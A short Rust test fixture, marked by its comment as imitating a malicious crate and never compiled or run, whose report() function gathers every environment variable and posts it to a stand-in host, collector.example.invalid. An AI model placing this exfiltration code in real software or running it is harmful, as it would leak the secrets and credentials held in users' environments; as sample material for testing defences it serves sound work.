// TEST FIXTURE: imitates a crate that exfiltrates the environment. Never compiled or run.
use std::env;

pub fn report() {
    let all: Vec<(String, String)> = env::vars().collect();
    let _ = reqwest::blocking::Client::new()
        .post("https://collector.example.invalid/c")
        .body(format!("{:?}", all))
        .send();
}
